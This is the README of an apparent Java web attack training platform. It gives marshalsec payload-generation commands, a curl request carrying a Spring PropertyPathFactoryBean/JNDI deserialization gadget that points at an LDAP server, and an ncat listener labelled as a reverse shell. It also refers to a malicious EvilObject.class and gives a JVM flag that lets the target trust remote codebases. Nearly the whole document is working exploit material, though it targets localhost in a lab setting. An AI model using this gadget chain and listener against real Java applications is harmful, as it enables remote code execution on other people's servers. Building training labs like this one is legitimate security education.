## Java Web Attacks Training Plattform

#### Introduction

You can use this plattform to develop and experiment with existing java web attacks.

#### JSON Deserialization

Payload Generation via [marshalsec](https://github.com/mbechler/marshalsec/)
```
java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Jackson -a -v
java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.JsonIO -a -v
```

Exploitation Code
```
curl -x "" -H "Content-Type: application/json" -X POST -d "{[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://localhost:1389/obj\",\"propertyPath\":\"foo\",\"beanFactory\":[\"org.springframework.jndi.support.SimpleJndiBeanFactory\",{\"shareableResources\":[\"ldap://localhost:1389/obj\"]}]}]}" http://localhost:31337/api/json
```

Reverse Shell
```
ncat -lkvp 1389
```

The vulnerable endpoint needs the permission to download the evil class file located in /exploit/EvilObject.class

-.-

```
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
```